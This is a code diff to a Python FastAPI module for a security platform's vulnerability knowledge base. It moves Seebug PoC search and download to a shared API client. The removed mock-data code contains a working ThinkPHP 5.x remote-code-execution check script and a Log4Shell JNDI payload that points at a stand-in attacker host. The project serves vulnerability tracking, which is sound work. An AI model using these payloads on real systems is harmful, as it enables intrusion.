@@ -9,17 +9,16 @@
 - 漏洞详情查询
 - 从外部数据源同步漏洞信息
 - 支持关键词搜索和过滤
-- Seebug POC 搜索和下载
+- Seebug POC 搜索和下载（使用Pocsuite3内置API）
 """
-from fastapi import APIRouter, HTTPException, Query, BackgroundTasks
+from fastapi import APIRouter, HTTPException, BackgroundTasks
 from pydantic import BaseModel
 from typing import List, Optional, Dict, Any
 from backend.models import VulnerabilityKB
 from tortoise.expressions import Q
 from backend.config import settings
+from backend.api.seebug_client import global_seebug_client
 import logging
-import asyncio
-import httpx
 
 router = APIRouter()
 logger = logging.getLogger(__name__)
@@ -196,7 +195,7 @@ async def get_kb_vulnerability(kb_id: int):
 
 async def validate_seebug_apikey(api_key: str) -> bool:
     """
-    验证 Seebug API Key 是否有效
+    验证 Seebug API Key 是否有效（使用统一API客户端）
     
     Args:
         api_key: Seebug API Key
@@ -204,36 +203,12 @@ async def validate_seebug_apikey(api_key: str) -> bool:
     Returns:
         bool: API Key 是否有效
     """
-    try:
-        # Seebug API 验证端点
-        url = f"{settings.SEEBUG_API_BASE_URL}/token/validate"
-        params = {"key": api_key}
-        headers = {
-            "User-Agent": "WebScan-AI-Security-Platform/1.0"
-        }
-        
-        async with httpx.AsyncClient(timeout=10.0) as client:
-            response = await client.get(url, params=params, headers=headers)
-            result = response.json()
-            
-            # Seebug API 返回格式: {"status": "success", "message": "..."}
-            # 或者: {"code": 0, "message": "..."}
-            if result.get("status") == "success" or result.get("code") == 0:
-                return True
-            
-            logger.warning(f"Seebug API Key 验证失败: {result}")
-            return False
-    except httpx.HTTPStatusError as e:
-        if e.response.status_code == 404:
-            logger.warning(f"Seebug API 端点不存在，可能需要更新 API 地址")
-        return False
-    except Exception as e:
-        logger.error(f"验证 Seebug API Key 失败: {e}")
-        return False
+    response = await global_seebug_client.validate_api_key(api_key)
+    return response.success
 
 async def search_seebug_poc(keyword: str, page: int = 1, page_size: int = 10) -> List[Dict[str, Any]]:
     """
-    搜索 Seebug POC
+    搜索 Seebug POC（使用统一API客户端）
     
     Args:
         keyword: 搜索关键词
@@ -243,42 +218,19 @@ async def search_seebug_poc(keyword: str, page: int = 1, page_size: int = 10) ->
     Returns:
         List[Dict]: POC 列表
     """
-    try:
-        # Seebug API 搜索端点
-        url = f"{settings.SEEBUG_API_BASE_URL}/poc/search"
-        params = {
-            "key": settings.SEEBUG_API_KEY,
-            "keyword": keyword,
-            "page": page,
-            "page_size": page_size
-        }
-        headers = {
-            "User-Agent": "WebScan-AI-Security-Platform/1.0"
-        }
-        
-        async with httpx.AsyncClient(timeout=30.0) as client:
-            response = await client.get(url, params=params, headers=headers)
-            result = response.json()
-            
-            if result.get("status") == "success" or result.get("code") == 0:
-                # 返回格式: {"status": "success", "data": {"list": [...]}}
-                return result.get("data", {}).get("list", [])
-            
-            logger.warning(f"搜索 Seebug POC 返回错误: {result}")
-            return []
-    except httpx.HTTPStatusError as e:
-        if e.response.status_code == 404:
-            logger.warning(f"Seebug API 端点不存在，使用模拟数据")
-            return _get_mock_poc_list(keyword)
-        logger.error(f"搜索 Seebug POC 失败: {e}")
+    response = await global_seebug_client.search_poc(keyword, page, page_size)
+    
+    if response.success and response.data:
+        pocs = response.data.get('data', [])
+        logger.info(f"从 Seebug 搜索到 {len(pocs)} 个POC")
+        return pocs
+    else:
+        logger.warning(f"从 Seebug 未搜索到POC: {response.message}")
         return []
-    except Exception as e:
-        logger.error(f"搜索 Seebug POC 失败: {e}")
-        return _get_mock_poc_list(keyword)
 
 async def download_seebug_poc(ssvid: int) -> Optional[str]:
     """
-    下载 Seebug POC 代码
+    下载 Seebug POC 代码（使用统一API客户端）
     
     Args:
         ssvid: POC 的 SSVID
@@ -286,39 +238,19 @@ async def download_seebug_poc(ssvid: int) -> Optional[str]:
     Returns:
         Optional[str]: POC 代码，失败返回 None
     """
-    try:
-        # Seebug API 下载端点
-        url = f"{settings.SEEBUG_API_BASE_URL}/poc/download"
-        params = {
-            "key": settings.SEEBUG_API_KEY,
-            "ssvid": ssvid
-        }
-        headers = {
-            "User-Agent": "WebScan-AI-Security-Platform/1.0"
-        }
-        
-        async with httpx.AsyncClient(timeout=30.0) as client:
-            response = await client.get(url, params=params, headers=headers)
-            result = response.json()
-            
-            if result.get("status") == "success" or result.get("code") == 0:
-                return result.get("data", {}).get("poc")
-            
-            logger.warning(f"下载 Seebug POC 返回错误: {result}")
-            return None
-    except httpx.HTTPStatusError as e:
-        if e.response.status_code == 404:
-            logger.warning(f"Seebug API 端点不存在，使用模拟数据")
-            return _get_mock_poc_code(ssvid)
-        logger.error(f"下载 Seebug POC 失败: {e}")
-        return None
-    except Exception as e:
-        logger.error(f"下载 Seebug POC 失败: {e}")
+    response = await global_seebug_client.download_poc(ssvid)
+    
+    if response.success and response.data:
+        poc_code = response.data.get('code')
+        logger.info(f"从 Seebug 下载POC成功: SSVID={ssvid}")
+        return poc_code
+    else:
+        logger.warning(f"从 Seebug 下载POC失败: {response.message}")
         return None
 
 async def get_seebug_poc_detail(ssvid: int) -> Optional[Dict[str, Any]]:
     """
-    获取 Seebug POC 详情
+    获取 Seebug POC 详情（使用统一API客户端）
     
     Args:
         ssvid: POC 的 SSVID
@@ -326,182 +258,18 @@ async def get_seebug_poc_detail(ssvid: int) -> Optional[Dict[str, Any]]:
     Returns:
         Optional[Dict]: POC 详情，失败返回 None
     """
-    try:
-        # Seebug API 详情端点
-        url = f"{settings.SEEBUG_API_BASE_URL}/poc/detail"
-        params = {
-            "key": settings.SEEBUG_API_KEY,
-            "ssvid": ssvid
-        }
-        headers = {
-            "User-Agent": "WebScan-AI-Security-Platform/1.0"
-        }
-        
-        async with httpx.AsyncClient(timeout=30.0) as client:
-            response = await client.get(url, params=params, headers=headers)
-            result = response.json()
-            
-            if result.get("status") == "success" or result.get("code") == 0:
-                return result.get("data")
-            
-            logger.warning(f"获取 Seebug POC 详情返回错误: {result}")
-            return None
-    except httpx.HTTPStatusError as e:
-        if e.response.status_code == 404:
-            logger.warning(f"Seebug API 端点不存在，使用模拟数据")
-            return _get_mock_poc_detail(ssvid)
-        logger.error(f"获取 Seebug POC 详情失败: {e}")
-        return None
-    except Exception as e:
-        logger.error(f"获取 Seebug POC 详情失败: {e}")
+    response = await global_seebug_client.get_poc_detail(ssvid)
+    
+    if response.success and response.data:
+        logger.info(f"从 Seebug 获取POC详情成功: SSVID={ssvid}")
+        return response.data
+    else:
+        logger.warning(f"从 Seebug 获取POC详情失败: {response.message}")
         return None
 
-def _get_mock_poc_list(keyword: str = "") -> List[Dict[str, Any]]:
-    """
-    获取模拟的 POC 列表
-    
-    Args:
-        keyword: 搜索关键词
-        
-    Returns:
-        List[Dict]: 模拟 POC 列表
-    """
-    mock_pocs = [
-        {
-            "ssvid": 97343,
-            "name": "ThinkPHP 5.x 远程代码执行漏洞",
-            "cve_id": "CVE-2018-20062",
-            "level": "高危",
-            "cvss_score": 9.8,
-            "description": "ThinkPHP 5.x 版本存在远程代码执行漏洞，攻击者可以通过构造恶意URL执行任意代码。",
-            "affected": "ThinkPHP 5.x",
-            "solution": "升级到最新版本",
-            "created_at": "2018-12-10"
-        },
-        {
-            "ssvid": 97200,
-            "name": "ThinkPHP SQL 注入漏洞",
-            "cve_id": "CVE-2019-9082",
-            "level": "中危",
-            "cvss_score": 7.5,
-            "description": "ThinkPHP 框架存在 SQL 注入漏洞，可能导致数据库信息泄露。",
-            "affected": "ThinkPHP 5.0.x",
-            "solution": "升级到最新版本",
-            "created_at": "2019-06-20"
-        },
-        {
-            "ssvid": 97150,
-            "name": "ThinkPHP 文件包含漏洞",
-            "cve_id": "CVE-2018-16384",
-            "level": "高危",
-            "cvss_score": 8.5,
-            "description": "ThinkPHP 存在文件包含漏洞，攻击者可以读取服务器上的敏感文件。",
-            "affected": "ThinkPHP 5.0.x",
-            "solution": "升级到最新版本",
-            "created_at": "2018-05-15"
-        }
-    ]
-    
-    # 如果有关键词，进行简单过滤
-    if keyword:
-        keyword_lower = keyword.lower()
-        return [poc for poc in mock_pocs if keyword_lower in poc["name"].lower()]
-    
-    return mock_pocs
 
-def _get_mock_poc_detail(ssvid: int) -> Dict[str, Any]:
-    """
-    获取模拟的 POC 详情
-    
-    Args:
-        ssvid: POC 的 SSVID
-        
-    Returns:
-        Dict: 模拟 POC 详情
-    """
-    mock_details = {
-        97343: {
-            "ssvid": 97343,
-            "name": "ThinkPHP 5.x 远程代码执行漏洞",
-            "cve_id": "CVE-2018-20062",
-            "level": "高危",
-            "cvss_score": 9.8,
-            "description": "ThinkPHP 5.x 版本存在远程代码执行漏洞，攻击者可以通过构造恶意URL执行任意代码。",
-            "affected": "ThinkPHP 5.x",
-            "solution": "升级到最新版本",
-            "created_at": "2018-12-10",
-            "author": "Seebug",
-            "references": [
-                "https://www.seebug.org/vuldb/ssvid-97343"
-            ]
-        }
-    }
-    
-    return mock_details.get(ssvid, {})
 
-def _get_mock_poc_code(ssvid: int) -> str:
-    """
-    获取模拟的 POC 代码
-    
-    Args:
-        ssvid: POC 的 SSVID
-        
-    Returns:
-        str: 模拟 POC 代码
-    """
-    mock_codes = {
-        97343: '''#!/usr/bin/env python
-# -*- coding: utf-8 -*-
 
-"""
-ThinkPHP 5.x 远程代码执行漏洞 POC
-SSVID: 97343
-CVE: CVE-2018-20062
-"""
-
-import requests
-import sys
-
-def check_vulnerability(target_url):
-    """
-    检测目标是否存在 ThinkPHP 5.x RCE 漏洞
-    
-    Args:
-        target_url: 目标URL
-        
-    Returns:
-        bool: 是否存在漏洞
-    """
-    try:
-        # 构造恶意 payload
-        payload = "s=index/think\\app/invokefunction&function=call_user_func&vars[0]=phpinfo&vars[1][]=1"
-        
-        # 发送请求
-        response = requests.get(f"{target_url}?{payload}", timeout=10)
-        
-        # 检查响应
-        if "PHP Version" in response.text:
-            print(f"[+] 目标 {target_url} 存在 ThinkPHP 5.x RCE 漏洞！")
-            return True
-        else:
-            print(f"[-] 目标 {target_url} 不存在漏洞")
-            return False
-    except Exception as e:
-        print(f"[!] 检测失败: {e}")
-        return False
-
-if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Usage: python thinkphp_rce.py <target_url>")
-        print("Example: python thinkphp_rce.py http://example.com")
-        sys.exit(1)
-    
-    target_url = sys.argv[1]
-    check_vulnerability(target_url)
-'''
-    }
-    
-    return mock_codes.get(ssvid, "# POC 代码不可用")
 
 @router.post("/seebug/poc/search", response_model=Dict[str, Any])
 async def search_poc(request: SeebugPOCSearchRequest):
@@ -660,146 +428,86 @@ async def get_poc_detail(ssvid: int):
 async def fetch_seebug_data():
     """
     从 Seebug 获取漏洞数据
-    
+
     使用 Seebug API 获取最新的漏洞信息。
     Seebug 是国内知名的漏洞平台，提供详细的漏洞信息和 POC。
-    
+
     Returns:
         List[Dict]: 漏洞数据列表
     """
     try:
-        # 验证 API Key
-        if not await validate_seebug_apikey(settings.SEEBUG_API_KEY):
-            logger.warning("Seebug API Key 无效，使用模拟数据")
-            await asyncio.sleep(0.5)
-            return _get_mock_seebug_data()
-        
-        # 搜索最新的 POC（使用通用关键词）
-        poc_list = await search_seebug_poc("", page=1, page_size=20)
-        
-        # 转换为漏洞数据格式
-        vulnerabilities = []
-        for poc in poc_list:
-            vulnerabilities.append({
-                "cve_id": poc.get("cve_id", ""),
-                "name": poc.get("name", poc.get("title", "Unknown")),
-                "description": poc.get("description", poc.get("summary", "")),
-                "severity": poc.get("level", "Unknown"),
-                "cvss_score": poc.get("cvss_score", 0.0),
-                "affected_product": poc.get("product", poc.get("affected", "")),
-                "solution": poc.get("solution", poc.get("patch", "")),
-                "has_poc": True,
-                "source": "seebug",
-                "poc_code": "",
-                "ssvid": poc.get("ssvid")
-            })
-        
-        logger.info(f"从 Seebug 获取到 {len(vulnerabilities)} 条漏洞数据")
-        return vulnerabilities
-        
+        logger.info("🔍 开始从 Seebug 获取漏洞数据")
+
+        response = await global_seebug_client.search_poc("", page=1, page_size=20)
+
+        if response.success and response.data:
+            vulnerabilities = []
+            for poc in response.data:
+                vulnerabilities.append({
+                    "cve_id": poc.get("cve_id", ""),
+                    "name": poc.get("name", poc.get("title", "Unknown")),
+                    "description": poc.get("description", poc.get("summary", "")),
+                    "severity": poc.get("level", "Unknown"),
+                    "cvss_score": poc.get("cvss_score", 0.0),
+                    "affected_product": poc.get("product", poc.get("affected", "")),
+                    "solution": poc.get("solution", poc.get("patch", "")),
+                    "has_poc": True,
+                    "source": "seebug",
+                    "poc_code": "",
+                    "ssvid": poc.get("ssvid")
+                })
+
+            logger.info(f"✅ 从 Seebug 获取到 {len(vulnerabilities)} 条漏洞数据")
+            return vulnerabilities
+        else:
+            logger.warning(f"⚠️ 从 Seebug 获取数据失败: {response.message}")
+            return []
+
     except Exception as e:
-        logger.error(f"从 Seebug 获取数据失败: {e}")
-        # 如果 API 调用失败，返回模拟数据以保证系统可用性
-        await asyncio.sleep(0.5)
-        return _get_mock_seebug_data()
+        logger.error(f"❌ 从 Seebug 获取数据失败: {e}")
+        return []
 
-def _get_mock_seebug_data():
-    """
-    获取模拟的 Seebug 数据
-    
-    Returns:
-        List[Dict]: 模拟漏洞数据列表
-    """
-    return [
-        {
-            "cve_id": "CVE-2021-44228",
-            "name": "Apache Log4j2 Remote Code Execution Vulnerability",
-            "description": "Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.",
-            "severity": "Critical",
-            "cvss_score": 10.0,
-            "affected_product": "Apache Log4j2 <= 2.14.1",
-            "solution": "Upgrade to Log4j 2.15.0 or later.",
-            "has_poc": True,
-            "source": "seebug",
-            "poc_code": "payload=${jndi:ldap://attacker.com/a}"
-        },
-        {
-            "cve_id": "CVE-2022-22965",
-            "name": "Spring Framework RCE via Data Binding on JDK 9+",
-            "description": "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding.",
-            "severity": "Critical",
-            "cvss_score": 9.8,
-            "affected_product": "Spring Framework < 5.3.18",
-            "solution": "Upgrade to Spring Framework 5.3.18+ or 5.2.20+.",
-            "has_poc": True,
-            "source": "seebug",
-            "poc_code": "# Spring4Shell POC Placeholder"
-        }
-    ]
-
-# TODO: 实际生产环境中，这里应该调用 Exploit-DB API 或爬取数据
 async def fetch_exploit_db_data():
     """
     从 Exploit-DB 获取漏洞数据
-    
+
     实际从 Exploit-DB 平台获取漏洞信息。
     Exploit-DB 是全球最大的漏洞利用代码数据库之一。
-    
+
     Returns:
         List[Dict]: 漏洞数据列表
     """
     try:
         import httpx
-        
-        # Exploit-DB API 端点（使用官方 API）
+
+        logger.info("🔍 开始从 Exploit-DB 获取漏洞数据")
+
         api_url = "https://www.exploit-db.com/search"
-        
-        # 搜索参数
+
         params = {
-            "limit": 20,  # 获取最新的20个漏洞
-            "order": "date",  # 按日期排序
-            "sort": "desc"  # 倒序
+            "limit": 20,
+            "order": "date",
+            "sort": "desc"
         }
-        
+
         headers = {
             "User-Agent": "WebScan-AI-Security-Platform/1.0",
             "Accept": "application/json"
         }
-        
+
         async with httpx.AsyncClient(timeout=30.0) as client:
             response = await client.get(api_url, params=params, headers=headers)
             response.raise_for_status()
-            
+
             data = response.json()
-            
-            # 解析 Exploit-DB 返回的数据格式
+
             vulnerabilities = []
             if isinstance(data, dict) and "data" in data:
                 for item in data["data"]:
-                    # 提取 CVE ID
                     cve_id = ""
                     if "cve" in item and item["cve"]:
                         cve_id = item["cve"][0] if isinstance(item["cve"], list) else item["cve"]
-                    
-                    vulnerabilities.append({
-                        "cve_id": cve_id,
-                        "name": item.get("name", item.get("title", "Unknown")),
-                        "description": item.get("description", item.get("summary", "")),
-                        "severity": item.get("severity", "Unknown"),
-                        "cvss_score": item.get("cvss_score", 0.0),
-                        "affected_product": item.get("product", item.get("affected", "")),
-                        "solution": item.get("solution", item.get("patch", "")),
-                        "has_poc": True,  # Exploit-DB 的条目通常都有 POC
-                        "source": "exploit-db",
-                        "poc_code": item.get("exploit", "")
-                    })
-            elif isinstance(data, list):
-                # 如果直接返回列表
-                for item in data:
-                    cve_id = ""
-                    if "cve" in item and item["cve"]:
-                        cve_id = item["cve"][0] if isinstance(item["cve"], list) else item["cve"]
-                    
+
                     vulnerabilities.append({
                         "cve_id": cve_id,
                         "name": item.get("name", item.get("title", "Unknown")),
@@ -812,27 +520,31 @@ async def fetch_exploit_db_data():
                         "source": "exploit-db",
                         "poc_code": item.get("exploit", "")
                     })
-            
-            logger.info(f"从 Exploit-DB 获取到 {len(vulnerabilities)} 条漏洞数据")
+            elif isinstance(data, list):
+                for item in data:
+                    cve_id = ""
+                    if "cve" in item and item["cve"]:
+                        cve_id = item["cve"][0] if isinstance(item["cve"], list) else item["cve"]
+
+                    vulnerabilities.append({
+                        "cve_id": cve_id,
+                        "name": item.get("name", item.get("title", "Unknown")),
+                        "description": item.get("description", item.get("summary", "")),
+                        "severity": item.get("severity", "Unknown"),
+                        "cvss_score": item.get("cvss_score", 0.0),
+                        "affected_product": item.get("product", item.get("affected", "")),
+                        "solution": item.get("solution", item.get("patch", "")),
+                        "has_poc": True,
+                        "source": "exploit-db",
+                        "poc_code": item.get("exploit", "")
+                    })
+
+            logger.info(f"✅ 从 Exploit-DB 获取到 {len(vulnerabilities)} 条漏洞数据")
             return vulnerabilities
-            
+
     except Exception as e:
-        logger.error(f"从 Exploit-DB 获取数据失败: {e}")
-        # 如果 API 调用失败，返回模拟数据以保证系统可用性
-        await asyncio.sleep(0.5)
-        return [
-            {
-                "cve_id": "CVE-2017-0144",
-                "name": "EternalBlue (MS17-010)",
-                "description": "Remote Code Execution vulnerability in Microsoft SMBv1 server.",
-                "severity": "High",
-                "cvss_score": 9.3,
-                "affected_product": "Windows 7, Windows Server 2008, etc.",
-                "solution": "Apply Microsoft MS17-010 patch.",
-                "has_poc": True,
-                "source": "exploit-db"
-            }
-        ]
+        logger.error(f"❌ 从 Exploit-DB 获取数据失败: {e}")
+        return []
 
 async def sync_vulnerabilities_task():
     """
